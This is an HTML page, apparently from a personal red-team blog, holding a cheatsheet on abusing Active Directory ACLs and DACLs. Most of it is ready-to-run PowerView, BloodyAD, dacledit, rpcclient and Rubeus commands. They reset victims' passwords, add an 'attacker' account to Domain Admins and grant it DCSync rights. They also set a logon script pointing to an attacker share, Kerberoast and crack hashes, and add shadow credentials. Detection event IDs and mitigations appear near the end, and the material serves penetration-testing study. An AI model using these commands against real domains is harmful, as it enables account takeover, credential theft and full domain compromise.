@@ -1,0 +1,373 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+    <title>
+      vipa0z</title>
+  <meta name="author" content="vipa0z">
+  
+  <meta name="description" content="Documenting the mechanics of system failure through red team tactics, CTF writeups, malware analysis, and the path into deeper systems hacking.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="vipa0z"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="vipa0z" type="application/atom+xml">
+  
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/gitbook.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  
+
+        <!--  favicon/indexing -->
+        <link rel="icon" type="image/png" href="/favicon.ico/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicon.ico/favicon.svg" />
+        <link rel="shortcut icon" href="/favicon.ico/favicon.ico" />
+        <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicon.ico/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+	<div class="container">
+		<button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+			<span class="sr-only">Toggle navigation</span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+		</button>
+		<a class="navbar-brand" href="/">
+			vipa0z
+		</a>
+		<div class="collapse navbar-collapse nav-menu">
+			<ul class="nav navbar-nav">
+				
+					<li>
+						<a href="/index" title="Home">
+							<i class="fa fa-home"></i>Home
+						</a>
+					</li>
+					
+					<li>
+						<a href="/archives" title="All the articles.">
+							<i class="fa fa-archive"></i>Archives
+						</a>
+					</li>
+					
+					<li>
+						<a href="/tags" title="All the tags.">
+							<i class="fa fa-tags"></i>Tags
+						</a>
+					</li>
+					
+					<li>
+						<a href="/cheatsheets/" title="Cheatsheets_and_Notes">
+							<i class="fa fa-book"></i>Docs
+						</a>
+					</li>
+					
+					<li>
+						<a href="/about" title="About me.">
+							<i class="fa fa-user"></i>About Me
+						</a>
+					</li>
+					
+						<!-- Theme Toggle -->
+						<li>
+							<a href="#" class="theme-toggle-btn" aria-label="Toggle theme">
+								<i class="fa fa-moon-o"></i> Theme
+							</a>
+						</li>
+			</ul>
+		</div>
+	</div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+  <div class="container">
+  	<div class="content">
+    	 
+	
+		<div class="page-header">
+			<h1> </h1>
+		</div>
+	
+
+
+
+<div class="row page">
+	<!-- cols -->
+	
+	<div class="col-md-12"> 
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="ACL-and-DACL-Attacks"><a href="#ACL-and-DACL-Attacks" class="headerlink" title="ACL and DACL Attacks"></a>ACL and DACL Attacks</h1><p>Identify and exploit misconfigured Access Control Lists to gain elevated privileges or access to sensitive objects.<br>ACL abuse is one of the most powerful privilege escalation techniques in AD, often overlooked by defenders.</p>
+<h2 id="Quick-Reference"><a href="#Quick-Reference" class="headerlink" title="Quick Reference"></a>Quick Reference</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># PowerView - Find interesting ACLs</span></span><br><span class="line"><span class="built_in">Find-InterestingDomainAcl</span> <span class="literal">-ResolveGUIDs</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check specific user&#x27;s ACLs</span></span><br><span class="line"><span class="built_in">Get-DomainObjectAcl</span> <span class="literal">-Identity</span> targetuser <span class="literal">-ResolveGUIDs</span> | ? &#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-eq</span> <span class="variable">$sid</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add user to group (GenericAll/GenericWrite)</span></span><br><span class="line"><span class="built_in">Add-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">&#x27;Domain Admins&#x27;</span> <span class="literal">-Members</span> <span class="string">&#x27;attacker&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Understanding-ACL-Abuse"><a href="#Understanding-ACL-Abuse" class="headerlink" title="Understanding ACL Abuse"></a>Understanding ACL Abuse</h2><h3 id="Common-Abusable-ACEs"><a href="#Common-Abusable-ACEs" class="headerlink" title="Common Abusable ACEs"></a>Common Abusable ACEs</h3><table>
+<thead>
+<tr>
+<th>ACE Permission</th>
+<th>Abuse Method</th>
+<th>PowerView Function</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ForceChangePassword</td>
+<td>Reset user password</td>
+<td>Set-DomainUserPassword</td>
+</tr>
+<tr>
+<td>AddMembers</td>
+<td>Add to group</td>
+<td>Add-DomainGroupMember</td>
+</tr>
+<tr>
+<td>GenericAll</td>
+<td>Full control</td>
+<td>Set-DomainUserPassword, Add-DomainGroupMember</td>
+</tr>
+<tr>
+<td>GenericWrite</td>
+<td>Modify object</td>
+<td>Set-DomainObject</td>
+</tr>
+<tr>
+<td>WriteOwner</td>
+<td>Take ownership</td>
+<td>Set-DomainObjectOwner</td>
+</tr>
+<tr>
+<td>WriteDACL</td>
+<td>Modify permissions</td>
+<td>Add-DomainObjectACL</td>
+</tr>
+<tr>
+<td>AllExtendedRights</td>
+<td>All extended rights</td>
+<td>Set-DomainUserPassword</td>
+</tr>
+<tr>
+<td>AddSelf</td>
+<td>Add self to group</td>
+<td>Add-DomainGroupMember</td>
+</tr>
+</tbody></table>
+<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="PowerView-ACL-Enumeration"><a href="#PowerView-ACL-Enumeration" class="headerlink" title="PowerView ACL Enumeration"></a>PowerView ACL Enumeration</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Import PowerView</span></span><br><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find all interesting ACLs</span></span><br><span class="line"><span class="built_in">Find-InterestingDomainAcl</span> <span class="literal">-ResolveGUIDs</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Find ACLs for specific user</span></span><br><span class="line"><span class="variable">$sid</span> = <span class="built_in">Convert-NameToSid</span> username</span><br><span class="line"><span class="built_in">Get-DomainObjectAcl</span> <span class="literal">-ResolveGUIDs</span> <span class="literal">-Identity</span> * | ? &#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-eq</span> <span class="variable">$sid</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find objects where user has GenericAll</span></span><br><span class="line"><span class="built_in">Get-DomainObjectAcl</span> <span class="literal">-ResolveGUIDs</span> | ? &#123;<span class="variable">$_</span>.ActiveDirectoryRights <span class="operator">-match</span> <span class="string">&quot;GenericAll&quot;</span> <span class="operator">-and</span> <span class="variable">$_</span>.SecurityIdentifier <span class="operator">-match</span> <span class="variable">$sid</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find WriteDACL permissions</span></span><br><span class="line"><span class="built_in">Get-DomainObjectAcl</span> <span class="literal">-ResolveGUIDs</span> | ? &#123;<span class="variable">$_</span>.ActiveDirectoryRights <span class="operator">-match</span> <span class="string">&quot;WriteDacl&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="BloodHound-ACL-Analysis"><a href="#BloodHound-ACL-Analysis" class="headerlink" title="BloodHound ACL Analysis"></a>BloodHound ACL Analysis</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Collect data with SharpHound</span></span><br><span class="line">.\SharpHound.exe <span class="literal">-c</span> All <span class="literal">--zipfilename</span> bloodhound_data.zip</span><br><span class="line"></span><br><span class="line"><span class="comment"># In BloodHound GUI, run queries:</span></span><br><span class="line"><span class="comment"># - Shortest Path to Domain Admins</span></span><br><span class="line"><span class="comment"># - Find Principals with DCSync Rights</span></span><br><span class="line"><span class="comment"># - Find Computers where Domain Users are Local Admin</span></span><br><span class="line"><span class="comment"># - Shortest Path from Owned Principals</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="dacledit-py-Linux"><a href="#dacledit-py-Linux" class="headerlink" title="dacledit.py (Linux)"></a>dacledit.py (Linux)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Enumerate ACLs for user</span></span><br><span class="line">dacledit.py -action <span class="built_in">read</span> -principal user -target targetuser domain.local/user:password</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enumerate ACLs on domain object</span></span><br><span class="line">dacledit.py -action <span class="built_in">read</span> -target-dn <span class="string">&#x27;DC=domain,DC=local&#x27;</span> domain.local/user:password</span><br></pre></td></tr></table></figure>
+
+<h3 id="Native-Windows-ACL-Enumeration"><a href="#Native-Windows-ACL-Enumeration" class="headerlink" title="Native Windows ACL Enumeration"></a>Native Windows ACL Enumeration</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Get ACL for specific user</span></span><br><span class="line"><span class="built_in">Get-ADUser</span> username | <span class="built_in">Get-Acl</span> | <span class="built_in">Select-Object</span> <span class="literal">-ExpandProperty</span> Access</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get ACL for all users</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$line</span> <span class="keyword">in</span> [<span class="type">System.IO.File</span>]::ReadLines(<span class="string">&quot;C:\users.txt&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">Get-Acl</span> <span class="string">&quot;AD:\<span class="variable">$</span>(Get-ADUser <span class="variable">$line</span>)&quot;</span> | <span class="built_in">Select-Object</span> Path <span class="literal">-ExpandProperty</span> Access | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.IdentityReference <span class="operator">-match</span> <span class="string">&#x27;username&#x27;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Using dsacls</span></span><br><span class="line">dsacls.exe <span class="string">&quot;CN=targetuser,CN=Users,DC=domain,DC=local&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="ForceChangePassword"><a href="#ForceChangePassword" class="headerlink" title="ForceChangePassword"></a>ForceChangePassword</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># PowerView</span></span><br><span class="line"><span class="variable">$newpass</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;Password123!&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Set-DomainUserPassword</span> <span class="literal">-Identity</span> targetuser <span class="literal">-AccountPassword</span> <span class="variable">$newpass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Native PowerShell</span></span><br><span class="line"><span class="variable">$newpass</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;Password123!&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Set-ADAccountPassword</span> <span class="literal">-Identity</span> targetuser <span class="literal">-NewPassword</span> <span class="variable">$newpass</span> <span class="literal">-Reset</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux with rpcclient</span></span><br><span class="line">rpcclient <span class="literal">-U</span> domain/user%password <span class="number">10.10</span>.<span class="number">10.10</span></span><br><span class="line">rpcclient <span class="variable">$</span>&gt; setuserinfo2 targetuser <span class="number">23</span> <span class="string">&#x27;Password123!&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="AddMembers-Add-to-Group"><a href="#AddMembers-Add-to-Group" class="headerlink" title="AddMembers (Add to Group)"></a>AddMembers (Add to Group)</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># PowerView</span></span><br><span class="line"><span class="built_in">Add-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">&#x27;Domain Admins&#x27;</span> <span class="literal">-Members</span> <span class="string">&#x27;attacker&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Verify</span></span><br><span class="line"><span class="built_in">Get-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">&#x27;Domain Admins&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Native PowerShell</span></span><br><span class="line"><span class="built_in">Add-ADGroupMember</span> <span class="literal">-Identity</span> <span class="string">&#x27;Domain Admins&#x27;</span> <span class="literal">-Members</span> <span class="string">&#x27;attacker&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux with net rpc</span></span><br><span class="line">net rpc <span class="built_in">group</span> addmem <span class="string">&quot;Domain Admins&quot;</span> attacker <span class="literal">-U</span> domain/user%password <span class="literal">-S</span> <span class="number">10.10</span>.<span class="number">10.10</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="GenericAll-Abuse"><a href="#GenericAll-Abuse" class="headerlink" title="GenericAll Abuse"></a>GenericAll Abuse</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Change password</span></span><br><span class="line"><span class="variable">$newpass</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;Password123!&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Set-DomainUserPassword</span> <span class="literal">-Identity</span> targetuser <span class="literal">-AccountPassword</span> <span class="variable">$newpass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add to group</span></span><br><span class="line"><span class="built_in">Add-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">&#x27;Domain Admins&#x27;</span> <span class="literal">-Members</span> <span class="string">&#x27;targetuser&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set SPN for Kerberoasting</span></span><br><span class="line"><span class="built_in">Set-DomainObject</span> <span class="literal">-Identity</span> targetuser <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;serviceprincipalname=<span class="string">&#x27;fake/svc&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Targeted Kerberoasting</span></span><br><span class="line">.\Rubeus.exe kerberoast /user:targetuser /nowrap</span><br></pre></td></tr></table></figure>
+
+<h3 id="GenericWrite-Abuse"><a href="#GenericWrite-Abuse" class="headerlink" title="GenericWrite Abuse"></a>GenericWrite Abuse</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Set logon script</span></span><br><span class="line"><span class="built_in">Set-DomainObject</span> <span class="literal">-Identity</span> targetuser <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;scriptpath=<span class="string">&#x27;\\attacker\share\evil.bat&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable pre-authentication for ASREP roasting</span></span><br><span class="line"><span class="built_in">Set-DomainObject</span> <span class="literal">-Identity</span> targetuser <span class="operator">-XOR</span> <span class="selector-tag">@</span>&#123;useraccountcontrol=<span class="number">4194304</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set SPN for Kerberoasting</span></span><br><span class="line"><span class="built_in">Set-DomainObject</span> <span class="literal">-Identity</span> targetuser <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;serviceprincipalname=<span class="string">&#x27;fake/svc&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="WriteDACL-Abuse"><a href="#WriteDACL-Abuse" class="headerlink" title="WriteDACL Abuse"></a>WriteDACL Abuse</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Grant DCSync rights to user</span></span><br><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-TargetIdentity</span> <span class="string">&#x27;DC=domain,DC=local&#x27;</span> <span class="literal">-PrincipalIdentity</span> attacker <span class="literal">-Rights</span> DCSync</span><br><span class="line"></span><br><span class="line"><span class="comment"># Grant GenericAll on user</span></span><br><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-TargetIdentity</span> targetuser <span class="literal">-PrincipalIdentity</span> attacker <span class="literal">-Rights</span> All</span><br><span class="line"></span><br><span class="line"><span class="comment"># Verify</span></span><br><span class="line"><span class="built_in">Get-DomainObjectAcl</span> <span class="literal">-Identity</span> targetuser <span class="literal">-ResolveGUIDs</span> | ? &#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-match</span> <span class="variable">$attackerSID</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="WriteOwner-Abuse"><a href="#WriteOwner-Abuse" class="headerlink" title="WriteOwner Abuse"></a>WriteOwner Abuse</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Take ownership of object</span></span><br><span class="line"><span class="built_in">Set-DomainObjectOwner</span> <span class="literal">-Identity</span> targetuser <span class="literal">-OwnerIdentity</span> attacker</span><br><span class="line"></span><br><span class="line"><span class="comment"># Grant yourself full control</span></span><br><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-TargetIdentity</span> targetuser <span class="literal">-PrincipalIdentity</span> attacker <span class="literal">-Rights</span> All</span><br><span class="line"></span><br><span class="line"><span class="comment"># Abuse the object</span></span><br><span class="line"><span class="built_in">Set-DomainUserPassword</span> <span class="literal">-Identity</span> targetuser <span class="literal">-AccountPassword</span> <span class="variable">$newpass</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Linux-ACL-Abuse"><a href="#Linux-ACL-Abuse" class="headerlink" title="Linux ACL Abuse"></a>Linux ACL Abuse</h2><h3 id="BloodyAD"><a href="#BloodyAD" class="headerlink" title="BloodyAD"></a>BloodyAD</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Change password</span></span><br><span class="line">bloodyAD.py -u user -p password -d domain.local --host 10.10.10.10 <span class="built_in">set</span> password targetuser <span class="string">&#x27;Password123!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add to group</span></span><br><span class="line">bloodyAD.py -u user -p password -d domain.local --host 10.10.10.10 add groupMember <span class="string">&#x27;Domain Admins&#x27;</span> targetuser</span><br><span class="line"></span><br><span class="line"><span class="comment"># Grant DCSync rights</span></span><br><span class="line">bloodyAD.py -u user -p password -d domain.local --host 10.10.10.10 add dcsync targetuser</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set owner</span></span><br><span class="line">bloodyAD.py -u user -p password -d domain.local --host 10.10.10.10 <span class="built_in">set</span> owner targetuser attacker</span><br></pre></td></tr></table></figure>
+
+<h3 id="dacledit-py"><a href="#dacledit-py" class="headerlink" title="dacledit.py"></a>dacledit.py</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Grant DCSync rights</span></span><br><span class="line">dacledit.py -action write -rights DCSync -principal attacker -target-dn <span class="string">&#x27;DC=domain,DC=local&#x27;</span> domain.local/user:password</span><br><span class="line"></span><br><span class="line"><span class="comment"># Grant GenericAll</span></span><br><span class="line">dacledit.py -action write -rights FullControl -principal attacker -target targetuser domain.local/user:password</span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove ACE (cleanup)</span></span><br><span class="line">dacledit.py -action remove -ace-sid S-1-5-21-... domain.local/user:password</span><br></pre></td></tr></table></figure>
+
+<h2 id="Targeted-Kerberoasting"><a href="#Targeted-Kerberoasting" class="headerlink" title="Targeted Kerberoasting"></a>Targeted Kerberoasting</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Set SPN on user with GenericAll/GenericWrite</span></span><br><span class="line">targetedKerberoast.py -v -d domain.local -u user -p password --target targetuser</span><br><span class="line"></span><br><span class="line"><span class="comment"># Request TGS</span></span><br><span class="line">GetUserSPNs.py domain.local/user:password -request-user targetuser</span><br><span class="line"></span><br><span class="line"><span class="comment"># Crack hash</span></span><br><span class="line">hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="Shadow-Credentials-Attack"><a href="#Shadow-Credentials-Attack" class="headerlink" title="Shadow Credentials Attack"></a>Shadow Credentials Attack</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Add shadow credential (requires GenericAll/GenericWrite)</span></span><br><span class="line">.\Whisker.exe add /target:targetuser</span><br><span class="line"></span><br><span class="line"><span class="comment"># Request TGT with certificate</span></span><br><span class="line">.\Rubeus.exe asktgt /user:targetuser /certificate:cert.pfx /password:certpass /nowrap</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use TGT</span></span><br><span class="line">.\Rubeus.exe ptt /ticket:ticket.kirbi</span><br></pre></td></tr></table></figure>
+
+<h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><h3 id="ACL-Attack-Chains"><a href="#ACL-Attack-Chains" class="headerlink" title="ACL Attack Chains"></a>ACL Attack Chains</h3><p>Common privilege escalation paths:</p>
+<ol>
+<li><strong>User → GenericAll on Group → Add Self → Privileged Group Member</strong></li>
+<li><strong>User → WriteDACL on Domain → Grant DCSync → Dump Hashes</strong></li>
+<li><strong>User → GenericWrite on User → Set SPN → Kerberoast → Crack Password</strong></li>
+<li><strong>User → WriteOwner on User → Take Ownership → Grant Rights → Reset Password</strong></li>
+</ol>
+<h3 id="Detection"><a href="#Detection" class="headerlink" title="Detection"></a>Detection</h3><p>ACL abuse generates:</p>
+<ul>
+<li>Event ID 4662 (Operation performed on object)</li>
+<li>Event ID 4670 (Permissions changed)</li>
+<li>Event ID 4728 (Member added to security-enabled global group)</li>
+<li>Event ID 5136 (Directory service object modified)</li>
+<li>Event ID 4738 (User account changed)</li>
+</ul>
+<p>Monitor for:</p>
+<ul>
+<li>Unusual ACL modifications</li>
+<li>Unexpected group membership changes</li>
+<li>Password resets by non-admin users</li>
+<li>SPN additions to user accounts</li>
+<li>DCSync rights granted to non-admin accounts</li>
+</ul>
+<h3 id="BloodHound-Queries"><a href="#BloodHound-Queries" class="headerlink" title="BloodHound Queries"></a>BloodHound Queries</h3><p>Useful custom queries:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Find shortest path from owned user to Domain Admins</span><br><span class="line">MATCH p=shortestPath((u:User &#123;owned:true&#125;)-[*1..]-&gt;(g:Group &#123;name:&quot;DOMAIN ADMINS@DOMAIN.LOCAL&quot;&#125;))</span><br><span class="line">RETURN p</span><br><span class="line"></span><br><span class="line">// Find users with DCSync rights</span><br><span class="line">MATCH p=(u:User)-[:MemberOf|GetChanges*1..]-&gt;(d:Domain)</span><br><span class="line">RETURN p</span><br><span class="line"></span><br><span class="line">// Find computers where Domain Users are local admin</span><br><span class="line">MATCH p=(g:Group &#123;name:&quot;DOMAIN USERS@DOMAIN.LOCAL&quot;&#125;)-[:AdminTo]-&gt;(c:Computer)</span><br><span class="line">RETURN p</span><br></pre></td></tr></table></figure>
+
+<h3 id="Common-Misconfigurations"><a href="#Common-Misconfigurations" class="headerlink" title="Common Misconfigurations"></a>Common Misconfigurations</h3><p>Frequently found ACL issues:</p>
+<ul>
+<li>Help Desk groups with password reset rights on all users</li>
+<li>Service accounts with GenericAll on Domain Admins</li>
+<li>Users with WriteDACL on domain object</li>
+<li>Exchange groups with excessive permissions</li>
+<li>Nested group memberships leading to unintended rights</li>
+</ul>
+<h3 id="Privilege-Escalation-Paths"><a href="#Privilege-Escalation-Paths" class="headerlink" title="Privilege Escalation Paths"></a>Privilege Escalation Paths</h3><p><strong>Low Privilege → Domain Admin:</strong></p>
+<ol>
+<li>Enumerate ACLs with PowerView&#x2F;BloodHound</li>
+<li>Identify path to privileged group&#x2F;user</li>
+<li>Abuse ACL chain (GenericAll → WriteDACL → DCSync)</li>
+<li>Dump domain hashes</li>
+<li>Use DA hash for full compromise</li>
+</ol>
+<h3 id="Cleanup"><a href="#Cleanup" class="headerlink" title="Cleanup"></a>Cleanup</h3><p>Always clean up after ACL abuse:</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Remove from group</span></span><br><span class="line"><span class="built_in">Remove-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">&#x27;Domain Admins&#x27;</span> <span class="literal">-Members</span> <span class="string">&#x27;attacker&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove ACE</span></span><br><span class="line"><span class="built_in">Remove-DomainObjectAcl</span> <span class="literal">-TargetIdentity</span> targetuser <span class="literal">-PrincipalIdentity</span> attacker <span class="literal">-Rights</span> All</span><br><span class="line"></span><br><span class="line"><span class="comment"># Reset password (if changed)</span></span><br><span class="line"><span class="built_in">Set-DomainUserPassword</span> <span class="literal">-Identity</span> targetuser <span class="literal">-AccountPassword</span> <span class="variable">$originalpass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove SPN</span></span><br><span class="line"><span class="built_in">Set-DomainObject</span> <span class="literal">-Identity</span> targetuser <span class="literal">-Clear</span> serviceprincipalname</span><br></pre></td></tr></table></figure>
+
+<h3 id="Mitigation-Recommendations"><a href="#Mitigation-Recommendations" class="headerlink" title="Mitigation Recommendations"></a>Mitigation Recommendations</h3><p>For clients:</p>
+<ul>
+<li>Implement least privilege for ACLs</li>
+<li>Regularly audit ACLs with BloodHound</li>
+<li>Remove unnecessary ACEs</li>
+<li>Use AdminSDHolder for privileged accounts</li>
+<li>Monitor Event IDs 4662, 4670, 5136</li>
+<li>Implement tiered administration model</li>
+<li>Use Protected Users group</li>
+<li>Regular ACL audits with PowerView&#x2F;BloodHound</li>
+<li>Implement JEA (Just Enough Administration)</li>
+<li>Use LAPS for local admin passwords</li>
+</ul>
+<h3 id="AdminSDHolder"><a href="#AdminSDHolder" class="headerlink" title="AdminSDHolder"></a>AdminSDHolder</h3><p>Protected accounts inherit ACLs from AdminSDHolder:</p>
+<ul>
+<li>Domain Admins</li>
+<li>Enterprise Admins</li>
+<li>Schema Admins</li>
+<li>Administrators</li>
+<li>Account Operators</li>
+<li>Backup Operators</li>
+<li>Print Operators</li>
+<li>Server Operators</li>
+<li>Replicator</li>
+</ul>
+<p>ACLs reset every 60 minutes by SDProp process.</p>
+<h3 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-acl-ace/">ACL Attack Cheatsheet</a></li>
+<li><a target="_blank" rel="noopener" href="https://bloodhound.readthedocs.io/">BloodHound Documentation</a></li>
+<li><a target="_blank" rel="noopener" href="https://powersploit.readthedocs.io/">PowerView Documentation</a></li>
+<li><a target="_blank" rel="noopener" href="https://academy.hackthebox.com/course/preview/dacl-attacks-i">DACL Attacks HTB Academy</a></li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 vipa0z's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+  <script src="/js/theme-toggle.js"></script>
+</body>
+   </html>
